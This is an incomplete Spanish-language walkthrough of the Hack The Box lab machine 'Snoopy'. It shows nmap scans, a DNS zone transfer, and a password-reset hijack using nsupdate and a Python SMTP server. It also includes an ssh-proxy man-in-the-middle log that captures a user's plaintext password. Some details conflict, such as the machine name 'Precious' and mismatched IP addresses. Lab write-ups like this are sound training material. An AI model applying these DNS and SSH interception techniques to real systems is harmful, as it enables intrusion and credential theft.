# Snoopy Writeup

| Sistema Operativo | Dificultad | Puntos | Dirección IP |
|-------------------|------------|--------|-------------|
| Linux            | Fácil      | 20     | 10.10.11.189 |

**NOTA:** El writeup no está completo ya que solo tomé notas durante el proceso, pronto lo voy a actualizar.

## Intro
Klk mi gente!!!, mi nombre es the_owner, y en el día de hoy estaremos explotando la máquina Precious de HTB, es una máquina
Linux, que cuenta con un servicio web y uno ssh, vamos a ver que encontramos!

## Vamos al mambo
1. Primero vamos a ejecutar nuestro nmap para verificar los puertos abiertos que tiene la máquina:

```bash
nmap -sS -Pn -vvv 10.10.11.212 -oG allports
```

![img01](./img/Untitled%201.png)

2. Luego obtenido los puertos rápidamente podemos ejecutar un escaneo más profundo específicamente en esos puertos. Esto lo
haremos con el siguiente comando:


```
# Nmap 7.93 scan initiated Fri May 12 17:46:06 2023 as: nmap -sC -sV -n -vvv -p22,53,80 -oN nmap-results 10.10.11.212
Nmap scan report for 10.10.11.212
Host is up, received reset ttl 63 (0.13s latency).
Scanned at 2023-05-12 17:46:07 EDT for 16s
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwa6lTzS8uZRb7EebEXbLkAU0FpJ8k9KO+YwTTeEE7E3VgGZr4vOP4EOZce1XDgwR
| 256 545941e1719a1a879c1e995059bfe5ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZTgpF2zR6Xamvdn+NyIUGFtq7hXBd7RK3SM00IMQht
53/tcp open domain syn-ack ttl 63 ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid:
|_ bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_ Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 12 17:46:23 2023 -- 1 IP address (1 host up) scanned in 16.35 seconds
```


```
dig axfr @10.10.11.212 snoopy.htb
```

![img02](./img/Untitled%202.png)

Ajustamos en archivo /etc/hosts con los subdominios interesantes que hemos encontrado durante el escaneo con dig. 

![img03](./img/Untitled%203.png)


Usamos nsupdate

![img04](./img/Untitled%204.png)


Creamos un SMTP server por medio de python

![img05](./img/Untitled%205.png)

Recibimos el link de reset password

![img06](./img/Untitled%206.png)

Por medio de ssh mitm encontramos las credenciales del user cbrown.

![img07](./img/Untitled%207.png)

```
┌──(root㉿kali)-[/home/…/Desktop/htb/snoopy/ssh-proxy]
└─# ./ssh-proxy --rhost 10.10.11.212 --rport 22 hola
[OPTION] Server listen on local port 2222 default
[OPTION] Verbosity set to 0 default
[OPTION] Server load rsa key /etc/ssh/ssh_host_rsa_key default
[OPTION] lport = 2222, rhost = 10.10.11.212, rport = 22, verbosity = 0
[OPTION] hostkey = /etc/ssh/ssh_host_ed25519_key, rsakey = /etc/ssh/ssh_host_rsa_key, dsakey = /etc/ssh/ssh_host_dsa_key, ecdsakey = /etc/ss
rsakey : /etc/ssh/ssh_host_rsa_key
[SERVER] Listening on local port 2222
[SERVER] Bind accept
[SERVER] Set auth methods: (password)
[CLIENT] * Wait for connecting remote SERVER
[CLIENT] error: The server is unknown.
SHA256:XCYXaxdk/Kqjbrpe8gktW9N6/6egnc+Dy9V6SiBp4XY
[CLIENT] Auto Trust.
[CLIENT] Connecting SERVER 10.100.1.33
[CLIENT] * Wait for client shell
[SERVER] * If the user has used up all attempts, or if he hasn't been able to authenticate in 60 seconds (n * 100ms), disconnect
[CLIENT] > Try auth with Username:cbrown and Password:sn00pedcr3dential!!!
[CLIENT] Authentication successed (password), user:cbrown
[SERVER] < channel 0: new [server-session]
[CLIENT] > channel 0: new [client-session]
[CLIENT] > channel 0: send open
[CLIENT] Entering interactive session
[*** SERVER EVENT LOOP ***]
[CLIENT] ==> Exec command ls -la
```
ssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABgQCn0udhX7kIIQWObT4Uw0G03lxs+rlCO3qPLcdSv3DSpEFUFzOrOVwBaL273OEZD+r0iX
cbrown@snoopy.htb

Primera fase de lateral movement

![img08](./img/Untitled%208.png)

Segunda fase de lateral momevent

![img09](./img/Untitled%209.png)

![img10](./img/Untitled%2010.png)

Escalación de privs

![img11](./img/Untitled%2011.png)
